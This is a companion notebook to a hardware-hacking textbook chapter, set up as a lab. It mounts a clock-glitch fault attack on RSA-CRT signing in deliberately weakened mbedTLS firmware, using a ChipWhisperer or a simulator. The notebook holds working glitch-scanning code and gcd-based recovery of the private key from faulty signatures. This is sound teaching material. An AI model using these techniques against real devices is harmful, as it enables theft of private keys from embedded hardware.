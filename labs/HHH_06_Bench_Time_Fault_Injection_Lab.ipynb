{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Chapter 6: Bench Time: Fault Injection Lab\n",
    "\n",
    "This notebook is a companion to Chapter 6 of The Hardware Hacking Handbook by Jasper van Woudenberg and Colin O'Flynn.\n",
    "\n",
    "- If you'd like to use the simulator, set `SCOPETYPE` to `SIM` and `PLATFORM` to `CWLITEARM`\n",
    "- If you'd like to use ChipWhisperer hardware, set `SCOPETYPE` to `OPENADC` and `PLATFORM` to `CWLITEARM`.\n",
    "\n",
    "© 2021. This work is licensed under a [CC BY-SA 4.0 license](https://creativecommons.org/licenses/by-sa/4.0/). "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SCOPETYPE = 'SIM'\n",
    "PLATFORM = 'CWLITEARM'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Firmware"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Next, let's take a look at the RSA implementation we're attacking. For this attack, we'll be using the `work/projects/chipwhisperer/hardware/victims/firmware/simpleserial-rsa` project folder. There's a few files here, but the important one is `simpleserial-arm-rsa.c`. Open it. As you scroll through, you'll find all our public/private values. Next, navigate to `real_dec()`:\n",
    "\n",
    "```C\n",
    "uint8_t buf[128];\n",
    "uint8_t hash[32];\n",
    "uint8_t real_dec(uint8_t *pt)\n",
    "{\n",
    "     int ret = 0;\n",
    "\n",
    "     //first need to hash our message\n",
    "     memset(buf, 0, 128);\n",
    "     mbedtls_sha256(MESSAGE, 12, hash, 0);\n",
    "\n",
    "     trigger_high();\n",
    "     ret = simpleserial_mbedtls_rsa_rsassa_pkcs1_v15_sign(&rsa_ctx, NULL, NULL, MBEDTLS_RSA_PRIVATE, MBEDTLS_MD_SHA256, 32, hash, buf);\n",
    "     trigger_low();\n",
    "\n",
    "     //send back first 48 bytes\n",
    "     simpleserial_put('r', 48, buf);\n",
    "     return ret;\n",
    "}\n",
    "```\n",
    "\n",
    "You'll notice that we first hash our message (`\"Hello World!\"`) using SHA256. Once this is passed to the signature function, it will be padded according to the PKCS#1 v1.5 standard. This isn't too important now, but it will be important later. Next we sign our message using `simpleserial_mbedtls_rsa_rsassa_pkcs1_v15_sign()`, then send back the first 48 bytes of it. We'll be sending the signature back in multiple chunks to avoid overflowing the CWLite's buffer of 128 bytes via `sig_chunk_1()` and `sig_chunk_2()` directly below this function.\n",
    "\n",
    "We'll actually skip over `simpleserial_mbedtls_rsa_rsassa_pkcs1_v15_sign()` here, since most of the important stuff actually happens in a different function. You should note, however, that this function has been modified to remove a signature check, which would need to be bypassed in a real attack.\n",
    "\n",
    "Next, find the function `simpleserial_mbedtls_rsa_private()`, a cleaned up version of `mbedtls_rsa_private()`, where the signature calculation actually happens:\n",
    "```C\n",
    "/*\n",
    " * Do an RSA private key operation\n",
    " */\n",
    "static int simpleserial_mbedtls_rsa_private( mbedtls_rsa_context *ctx,\n",
    "                 int (*f_rng)(void *, unsigned char *, size_t),\n",
    "                 void *p_rng,\n",
    "                 const unsigned char *input,\n",
    "                 unsigned char *output )\n",
    "\n",
    "```\n",
    "\n",
    "scrolling down a bit, we do indeed find that this function uses CRT to speed up the calculation:\n",
    "\n",
    "```C\n",
    "    /*\n",
    "     * Faster decryption using the CRT\n",
    "     *\n",
    "     * T1 = input ^ dP mod P\n",
    "     * T2 = input ^ dQ mod Q\n",
    "     */\n",
    "    MBEDTLS_MPI_CHK( mbedtls_mpi_exp_mod( &T1, &T, DP, &ctx->P, &ctx->RP ) );\n",
    "    MBEDTLS_MPI_CHK( mbedtls_mpi_exp_mod( &T2, &T, DQ, &ctx->Q, &ctx->RQ ) );\n",
    "```\n",
    "\n",
    "You can view more of the firmware if you want, but for now let's build our firmware. You can ignore the warnings at the end. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "CRYPTO_TARGET=\"MBEDTLS\"\n",
    "CRYPTO_OPTIONS=\"RSA\"\n",
    "NANO_FLASH = \"NA\"\n",
    "OPT = \"2\"\n",
    "if SCOPETYPE == \"CWNANO\":\n",
    "    NANO_FLASH = \"32K\" #Need nano pro 32\n",
    "    OPT = \"2\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash -s \"$PLATFORM\" \"$CRYPTO_TARGET\" \"$CRYPTO_OPTIONS\" \"$NANO_FLASH\"\n",
    "cd ../hardware/victims/firmware/simpleserial-rsa\n",
    "make PLATFORM=$1 CRYPTO_TARGET=$2 CRYPTO_OPTIONS=$3 OPT=2 NANO_FLASH=$4"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Getting a correct signature from the target"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Start by initializing the ChipWhisperer:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "if SCOPETYPE == 'OPENADC':\n",
    "    %run \"Helper_Scripts/Setup_Generic.ipynb\"\n",
    " \n",
    "    scope.clock.adc_src = \"clkgen_x1\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Next, program it with our new firmware:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "if SCOPETYPE == 'OPENADC':\n",
    "    import time\n",
    "    fw_path = \"../hardware/victims/firmware/simpleserial-rsa/simpleserial-rsa-{}.hex\".format(PLATFORM)\n",
    "    cw.program_target(scope, prog, fw_path)\n",
    "    time.sleep(1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Getting the  signature"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Let's start by seeing if we can verify the signature that we get back. First, we run the signature calculation (there's a `time.sleep()` here to make sure the calculation finishes. You may need to increase this):"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "if SCOPETYPE == 'OPENADC':\n",
    "    import time\n",
    "    target.flush()\n",
    "    scope.arm()\n",
    "    target.write(\"t\\n\")\n",
    "\n",
    "    ret = scope.capture()\n",
    "    if ret:\n",
    "        print('Timeout happened during acquisition')\n",
    "\n",
    "    time.sleep(2)\n",
    "    output = target.read(timeout=10)\n",
    "    \n",
    "    print(scope.adc.trig_count)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "As you can see, the signature takes a long time! For the STM32F3, it should be around 10.4M cycles. Next, let's get the rest of the signature back and see what it looks like."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "if SCOPETYPE == 'OPENADC':\n",
    "    target.write(\"1\\n\")\n",
    "    time.sleep(0.2)\n",
    "    output += target.read(timeout=10)\n",
    "\n",
    "    target.write(\"2\\n\")\n",
    "    time.sleep(0.2)\n",
    "    output += target.read(timeout=10)\n",
    "    \n",
    "else: # SIM\n",
    "    output = \"r4F09799F6A59081B725599753330B7A2440ABC42606601622FE0C582646E32555303E1062A2989D9B4C265431ADB58DD\\nz00\\nr85BB33C4BB237A311BC40C1279528FD6BB36F94F534A4D8284A18AB8E5670E734C55A6CCAB5FB5EAE02BA37E2D56648D\\nz00\\nr7A13BBF17A0E07D607C07CBB72C7A7A77076376E8434CE6E136832DC95DB3D80\\nz00\"\n",
    "    \n",
    "print(output)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "You should see something like:\n",
    "```\n",
    "r4F09799F6A59081B725599753330B7A2440ABC42606601622FE0C582646E32555303E1062A2989D9B4C265431ADB58DD\n",
    "z00\n",
    "r85BB33C4BB237A311BC40C1279528FD6BB36F94F534A4D8284A18AB8E5670E734C55A6CCAB5FB5EAE02BA37E2D56648D\n",
    "z00\n",
    "r7A13BBF17A0E07D607C07CBB72C7A7A77076376E8434CE6E136832DC95DB3D80\n",
    "z00\n",
    "```\n",
    "\n",
    "We'll need to strip all the extra simpleserial stuff out. This can be done like so:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "newout = output.replace(\"r\", \"\").replace(\"\\nz00\",\"\").replace(\"\\n\",\"\")\n",
    "print(newout)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Then we can convert this to binary using binascii:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from binascii import unhexlify, hexlify\n",
    "sig = unhexlify(newout)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Verifying the signature\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Finally, we can verify that the signature is correct using the PyCryptodome package:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from Crypto.PublicKey import RSA\n",
    "from Crypto.Signature import PKCS1_v1_5 \n",
    "\n",
    "from Crypto.Hash import SHA256\n",
    "\n",
    "e = 0x10001\n",
    "N = 0x9292758453063D803DD603D5E777D7888ED1D5BF35786190FA2F23EBC0848AEADDA92CA6C3D80B32C4D109BE0F36D6AE7130B9CED7ACDF54CFC7555AC14EEBAB93A89813FBF3C4F8066D2D800F7C38A81AE31942917403FF4946B0A83D3D3E05EE57C6F5F5606FB5D4BC6CD34EE0801A5E94BB77B07507233A0BC7BAC8F90F79\n",
    "m = b\"Hello World!\"\n",
    "\n",
    "hash_object = SHA256.new(data=m)\n",
    "pub_key = RSA.construct((N, e))\n",
    "signer = PKCS1_v1_5.new(pub_key) \n",
    "sig_check = signer.verify(hash_object, sig)\n",
    "print(sig_check)\n",
    "\n",
    "assert sig_check, \"Failed to verify signature on device. Got: {}\".format(newout)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If everything worked out correctly, you should see `True` printed above. Now onto the actual attack."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Injecting the fault"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This section is broken into two: getting a fault from the CW, and getting the fault from the simulator."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Getting a simulated fault"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If we're running using the RSA CRT simulator instead, we're going to build and sign the message ourselves.\n",
    "\n",
    "As was mentioned earlier, the message that's signed isn't the original message, it's a PKCS#1 v1.5 padded hash of it. Luckily, this standard's fairly simple. PKCS#1 v1.5 padding looks like:\n",
    "\n",
    "\\|00\\|01\\|ff...\\|00\\|hash_prefix\\|message_hash\\|\n",
    "\n",
    "Here, the ff... part is a string of ff bytes long enough to make the size of the padded message the same as N, while hash_prefix is an identifier number for the hash algorithm used on message_hash. In our case, SHA256 has the hash prefix `3031300d060960864801650304020105000420`.\n",
    "\n",
    "The `build_message` function below implements this:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# PKCS#1 v1.5 padding\n",
    "def build_message(m, N):\n",
    "    sha_id = \"3031300d060960864801650304020105000420\"\n",
    "    N_len = (len(bin(N)) - 2 + 7) // 8\n",
    "    pad_len = (len(hex(N)) - 2) // 2 - 3 - len(m)//2 - len(sha_id)//2\n",
    "    padded_m = \"0001\" + \"ff\" * pad_len + \"00\" + sha_id + m\n",
    "    return padded_m\n",
    "\n",
    "print(\"Message:       {}\".format(m))\n",
    "\n",
    "# Encode message\n",
    "hash_object = SHA256.new(data=m)\n",
    "hashed_m = hexlify(hash_object.digest()).decode()\n",
    "padded_m = build_message(hashed_m, N)\n",
    "msg = int.from_bytes(unhexlify(padded_m), byteorder='big') \n",
    "print(\"Padded/hashed: {}\".format(padded_m))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Next, let's calculate the RSA CRT signature, without any faults. We will need the parameters `p` and `q` for this. Just note that the code to recover the primes later on does not use these."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from gmpy2 import invert, powmod, gcd, gcdext\n",
    "\n",
    "if SCOPETYPE == 'SIM':\n",
    "    # RSA parameters\n",
    "    p = 0xc36d0eb7fcd285223cfb5aaba5bda3d82c01cad19ea484a87ea4377637e75500fcb2005c5c7dd6ec4ac023cda285d796c3d9e75e1efc42488bb4f1d13ac30a57\n",
    "    q = 0xc000df51a7c77ae8d7c7370c1ff55b69e211c2b9e5db1ed0bf61d0d9899620f4910e4168387e3c30aa1e00c339a795088452dd96a9a5ea5d9dca68da636032af\n",
    "    phi = (p-1)*(q-1)\n",
    "    d = invert(e, phi)\n",
    "\n",
    "    # CRT parameters\n",
    "    dp = invert(e, (p-1))\n",
    "    dq = invert(e, (q-1))\n",
    "    qinv = invert(q, p)\n",
    "\n",
    "    # CRT calculation\n",
    "    sp = powmod(msg, dp, p)\n",
    "    sq = powmod(msg, dq, q)\n",
    "    s_crt = sq + q * ((sp-sq) * qinv % p)\n",
    "\n",
    "    # Use previous captured corect signature, to verify they are the same\n",
    "    s = int.from_bytes(sig, byteorder='big') \n",
    "    print(\"Signature:  {}\".format(hex(s)))\n",
    "    print(\"s == s_crt? {}\".format(s == s_crt))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now that we have a correct signature calculated from parts `sp` and `sq`, lets flip anywhere between 1 and 20 bits in `sp` to simulate faults. We should get a different signature."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from random import randint, sample\n",
    "\n",
    "if SCOPETYPE == 'SIM':\n",
    "    # Now, flip arbitrary bits in sp, and calculate corrupted signature\n",
    "    bits = sorted(sample(range(0, sp.bit_length()), randint(1,20))) # Get faulty bit indices\n",
    "    faults = sum([1 << x for x in bits])                            # Convert to large int\n",
    "    sp_x = sp ^ faults                                              # Add faults to sp\n",
    "    s_crt_x = sq + q * ((sp_x-sq) * qinv % p)                       # Calculate faulty RSA CRT signature\n",
    "    print(\"Faults injected:     {}\".format(bits))\n",
    "    print(\"Corrupted signature: {}\".format(hex(s_crt_x)))\n",
    "    print(\"s_crt_x != s_crt?    {}\".format(s_crt != s_crt_x))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Faulting the ChipWhisperer"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "As usual, we'll start off by setting up the glitch module:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "if SCOPETYPE == 'OPENADC':\n",
    "    scope.glitch.clk_src = \"clkgen\"\n",
    "    scope.glitch.output = \"clock_xor\"\n",
    "    scope.glitch.trigger_src = \"ext_single\"\n",
    "    scope.glitch.repeat = 1\n",
    "    scope.glitch.width = -9\n",
    "    scope.glitch.offset = -38.3\n",
    "    scope.io.hs2 = \"glitch\"\n",
    "    print(scope.glitch)\n",
    "    from collections import namedtuple\n",
    "    Range = namedtuple('Range', ['min', 'max', 'step'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now for our actual attack loop. There's a lot going on here, so we'll move through a little slower than usual. Overall, what we want to do is:\n",
    "* Insert a glitch\n",
    "* Read the signature back\n",
    "* Verify that it's correct\n",
    "\n",
    "The first step is the same as earlier. For the last two, we'll cheat a little by checking the for the beginning of the correct signature before proceeding, but we could also read back the whole thing:\n",
    "\n",
    "```python\n",
    "# Read back signature\n",
    "output = target.read(timeout=10)\n",
    "    if \"4F09799\" not in output:\n",
    "        #Something abnormal has happened\n",
    "```\n",
    "\n",
    "Now that we've found some abnormal behaviour, we need to verify that the target hasn't crashed. This can be done pretty easily by checking if we got anything at all:\n",
    "\n",
    "```python\n",
    "if \"4F09799\" not in output:\n",
    "    #Something abnormal has happened\n",
    "    if len(output) > 0:\n",
    "        # Possible glitch!\n",
    "    else:\n",
    "        # Crash, reset and try again\n",
    "        print(f\"Probably crash at {scope.glitch.ext_offset}\")\n",
    "        reset_target(scope)\n",
    "        time.sleep(0.5)\n",
    "```\n",
    "\n",
    "As a last step, we'll build our full signature and do one final check to make sure everything looks okay:\n",
    "\n",
    "```python\n",
    "if len(output) > 0:\n",
    "    # Possible glitch!\n",
    "    print(f\"Possible glitch at offset {scope.glitch.ext_offset}\\nOutput: {output}\")\n",
    "    \n",
    "    # get rest of signature back\n",
    "    target.go_cmd = '1\\\\n'\n",
    "    target.go()\n",
    "    time.sleep(0.2)\n",
    "    output += target.read(timeout=10)\n",
    "\n",
    "    target.go_cmd = '2\\\\n'\n",
    "    target.go()\n",
    "    time.sleep(0.2)\n",
    "    output += target.read(timeout=10)\n",
    "    \n",
    "    # strip out extra simpleserial stuff\n",
    "    newout = output.replace(\"r\", \"\").replace(\"\\nz00\",\"\").replace(\"\\n\",\"\")\n",
    "    \n",
    "    print(f\"Full output: {newout}\")\n",
    "    if (len(newout) == 256) and \"r0001F\" not in output:\n",
    "        print(\"Very likely glitch!\")\n",
    "        break\n",
    "```\n",
    "\n",
    "We'll add in scanning over different offsets as well. We'll start at an offset of 7M cycles. We actually have a lot of area that we could place the glitch in, so the starting point is fairly arbitrary. For the STM32F3, this places the glitch near the beginning of the calculation for $s_2$. If you'd like, you can move `trigger_low()` into `simpleserial_mbedtls_rsa_private()` to see how long different parts of the algorithm take.\n",
    "\n",
    "All together, our attack loops looks like this:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "if SCOPETYPE == 'OPENADC':\n",
    "\n",
    "    from tqdm import tnrange\n",
    "    import time\n",
    "    for i in tnrange(7000000, 7100000):\n",
    "        scope.glitch.ext_offset = i\n",
    "        scope.adc.timeout = 3\n",
    "        target.flush()\n",
    "        scope.arm()\n",
    "        target.write(\"t\\n\")\n",
    "\n",
    "        ret = scope.capture()\n",
    "        if ret:\n",
    "            print('Timeout happened during acquisition')\n",
    "        time.sleep(2)\n",
    "\n",
    "        # Read back signature\n",
    "        output = target.read(timeout=10)\n",
    "        if \"4F09799\" not in output:\n",
    "            # Something abnormal happened\n",
    "            if len(output) > 0:\n",
    "                # Possible glitch!\n",
    "                print(\"Possible glitch at offset {}\\nOutput: {}\".format(scope.glitch.ext_offset, output))\n",
    "\n",
    "                # Get rest of signature back\n",
    "                target.write(\"1\\n\")\n",
    "                time.sleep(0.2)\n",
    "                output += target.read(timeout=10)\n",
    "\n",
    "                target.write(\"2\\n\")\n",
    "                time.sleep(0.2)\n",
    "                output += target.read(timeout=10)\n",
    "\n",
    "                # Strip out extra simpleserial stuff\n",
    "                newout = output.replace(\"r\", \"\").replace(\"\\nz00\",\"\").replace(\"\\n\",\"\")\n",
    "                print(\"Full output: {}\".format(newout))\n",
    "                if (len(newout) == 256) and \"r0001F\" not in output:\n",
    "                    print(\"Very likely glitch!\")\n",
    "                    break\n",
    "            else:\n",
    "                # Crash, reset and try again\n",
    "                print(\"Probably crashed at {}\".format(scope.glitch.ext_offset))\n",
    "                reset_target(scope)\n",
    "                time.sleep(0.5)\n",
    "                \n",
    "    # Convert signature to integer\n",
    "    sig = unhexlify(newout)\n",
    "    s_crt_x = mpz(int.from_bytes(sig, \"big\"))\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "An output from this script could be:\n",
    "```\n",
    "Probably crashed at 7000014\n",
    "Probably crashed at 7000017\n",
    "Probably crashed at 7000028\n",
    "Possible glitch at offset 7000042\n",
    "Output: <removed for brevity>\n",
    "\n",
    "Full output: 1187B790564D43D48CD140A7FF890EEA713D1603D8CBC57CF070EE951479C75E93FE98AD04F535109D957F9AB9AA25DB2FB1A5521C68C986A270782B7A579A12B9AE79DF2F59ED9E6694C64C40AAD9FE46B203DB75792016EEA315F7CAA8F9AAC0FD89052FFAC29C022E32B541B150419E2B6604DDA6BF2582F62C9F7876393D\n",
    "Very likely glitch!```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Completing The Attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "With a faulty signature, we can start our first recovery using a correct signature."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Recover p and q from corrupted signature and correct signature\n",
    "calc_q = gcd(s_crt_x - s_crt, N)\n",
    "calc_p = N // calc_q\n",
    "print(\"Recovered p using s: {}\".format(hex(calc_p)))\n",
    "print(\"Recovered q using s: {}\".format(hex(calc_q)))\n",
    "print(\"pq == N?             {}\".format(calc_q * calc_p == N))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If `pq == N`, that means we have our primes!\n",
    "\n",
    "In case we don't have a correct signature over the same message, we will extract the primes from the corrupted signature and knowledge of the message."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Recover p and q from corrupted signature and message\n",
    "calc_q2 = gcd(msg - s_crt_x ** e, N)\n",
    "calc_p2 = N // calc_q2\n",
    "print(\"Recovered p using m: {}\".format(hex(calc_p2)))\n",
    "print(\"Recovered q using m: {}\".format(hex(calc_q2)))\n",
    "print(\"pq == N?             {}\".format(calc_q2 * calc_p2 == N))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Finally, there's d, which can be derived by:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "phi = (calc_q - 1)*(calc_p - 1)\n",
    "gcd, d_test, b = gcdext(e, phi)\n",
    "\n",
    "print(\"Recovered d: {}\".format(hex(d_test)))\n",
    "print(\"d_test == d? {}\".format(d_test == d))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now that we have all parameters, we can also recover the original message."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "# Decrypt the message from recovered private keys and print!\n",
    "m_calc = int(powmod(s_crt, e, N))\n",
    "print(\"m_calc == m? {}\".format(msg == m_calc))\n",
    "m_str = hexlify(m_calc.to_bytes((m_calc.bit_length() + 7) // 8, byteorder='big'))\n",
    "print(\"Message decrypted: {}\".format(m_str))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Going Further"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "There's still more you can do with this attack:\n",
    "\n",
    "* You can try glitching the other part of the signature calculation to verify that you get the other prime factor of N out\n",
    "* We used clock glitching in this tutorial. You may want to try it with voltage glitching as well\n",
    "\n",
    "As mentioned earlier in the tutorial, a verification of the calculated signature was removed:\n",
    "```C\n",
    "    /* Compare in constant time just in case */\n",
    "    /* for( diff = 0, i = 0; i < ctx->len; i++ ) */\n",
    "    /*     diff |= verif[i] ^ sig[i]; */\n",
    "    /* diff_no_optimize = diff; */\n",
    "\n",
    "    /* if( diff_no_optimize != 0 ) */\n",
    "    /* { */\n",
    "    /*     ret = MBEDTLS_ERR_RSA_PRIVATE_FAILED; */\n",
    "    /*     goto cleanup; */\n",
    "    /* } */\n",
    "\n",
    "```\n",
    "\n",
    "This part is near the end of `simpleserial_mbedtls_rsa_rsassa_pkcs1_v15_sign()`. If you want a larger challenge, you can try uncommenting that and trying to glitch past it as well."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.7"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": false,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": false,
   "toc_position": {},
   "toc_section_display": true,
   "toc_window_display": false
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
